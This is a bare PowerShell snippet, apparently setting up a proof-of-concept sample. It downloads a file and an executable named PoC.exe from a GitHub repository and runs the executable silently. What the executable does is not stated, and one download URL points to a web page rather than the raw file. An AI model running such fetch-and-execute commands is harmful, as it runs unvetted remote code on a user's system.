Invoke-WebRequest 'https://raw.githubusercontent.com/squentel/mysamples/main/init2' -OutFile C:\data\init2
Invoke-WebRequest 'https://github.com/squentel/mysamples/blob/main/poc.exe' -OutFile C:\data\PoC.exe
Start-Process -Wait -FilePath ‘C:\data\PoC.exe’ -ArgumentList ‘/s’ -PassThru
